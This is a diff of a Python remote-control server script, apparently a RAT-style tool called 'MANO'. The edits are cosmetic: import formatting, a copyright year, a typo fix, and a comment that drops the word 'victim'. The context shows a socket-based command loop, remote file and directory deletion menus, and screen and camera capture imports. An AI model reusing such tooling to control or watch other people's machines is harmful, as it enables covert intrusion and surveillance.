@@ -1,6 +1,14 @@
-import socket,sys,os,threading
-import threading
-import time,shutil,cv2,pyautogui,pickle,struct,numpy as np
+#copyright © 2019-2021 manoharkakumani
+import socket
+import sys
+import os
+import time
+import shutil
+import cv2
+import pyautogui
+import pickle
+import struct
+import numpy as np
 #banner
 print("*******************************************************")
 print("""
@@ -9,7 +17,7 @@ print("""
 | |\/| | / _ \ |  \| | | | |  \ \ 
 | |  | |/ ___ \| |\  | |_| |  / / 
 |_|  |_/_/   \_\_| \_|\___/  /_/
-copyright © 2019 manoharkakumani""")
+copyright © 2019-2021 manoharkakumani""")
 print("\n******************************************************")
 #socket creating
 def sock():
@@ -28,7 +36,7 @@ host,s=sock()
 
 def dmenu(nm):
     print("----------------------------------------------------------------------------")
-    print("1. Delete file \n2. Delet Dir/Foleder \n3. Change "+nm+" Dir \n4. File list \n5. Exit \n")
+    print("1. Delete file \n2. Delet Dir/Folder \n3. Change "+nm+" Dir \n4. File list \n5. Exit \n")
     print("----------------------------------------------------------------------------")
 #deloading
 def dload():
@@ -360,7 +368,7 @@ help --> help \nback --> back to MANO\nexit -->to terminate : """+cip+"""\n""")
         else :
               print("Command not recognized")
 
-# Send commands to client/victim or a friend
+# Send commands to client
 def sendcommands(conn):
     try:
         conn.send(("cmd~echo").encode("utf-8"))
